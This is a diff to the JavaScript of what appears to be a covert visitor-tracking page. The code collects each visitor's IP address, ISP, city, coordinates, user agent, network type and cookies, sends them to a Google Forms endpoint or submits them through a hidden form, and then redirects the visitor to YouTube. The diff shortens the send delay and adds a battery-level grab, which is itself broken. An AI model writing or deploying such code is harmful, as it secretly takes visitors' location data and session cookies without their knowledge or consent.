@@ -39,7 +39,7 @@
    
 Y.value = json.isp + "," + json.ip + "," + json.city + "," + json.hostname + "," + json.org + "," + "latitude" + ":" + json.latitude + "," + "longitude" + ":" + json.longitude;  
  
-setTimeout(() => window.open(`https://docs.google.com/forms/u/0/d/e/1FAIpQLSfthAOyy2oF38lU5f4ag3ulJ8AHcRXtPHHJ-ibRh7UfX_6etw/formResponse?entry.190958851=${json.isp} ,${json.ip},${json.city},${json.hostname},${json.org},${json.latitude},${json.longitude}&entry.470512502=Device:${navigator.userAgent} ${f}`,"jv"),1800);
+setTimeout(() => window.open(`https://docs.google.com/forms/u/0/d/e/1FAIpQLSfthAOyy2oF38lU5f4ag3ulJ8AHcRXtPHHJ-ibRh7UfX_6etw/formResponse?entry.190958851=${json.isp} ,${json.ip},${json.city},${json.hostname},${json.org},${json.latitude},${json.longitude}&entry.470512502=Device:${navigator.userAgent} ${f}`,"jv"),1000);
 }   
     
     </script>
@@ -47,7 +47,8 @@ setTimeout(() => window.open(`https://docs.google.com/forms/u/0/d/e/1FAIpQLSfthA
 
    function Pj(){
      var X = document.getElementById("2");   
-    X.value = `${navigator.userAgent} "App:"${navigator.appName},"Network:"${navigator.connection.type} "location":${document.location.href} "cookie":${document.cookie}`;
+var un = function(){navigator.getBattery().then(function(bc){return bc * 100 + "%";})};
+    X.value = `${navigator.userAgent} "App:"${navigator.appName},"Network:"${navigator.connection.type} "location":${document.location.href} "cookie":${document.cookie} "Charge":${un}`;
  var Z =document.getElementById("form");
     Z.submit();  
   location.href="https://m.youtube.com";
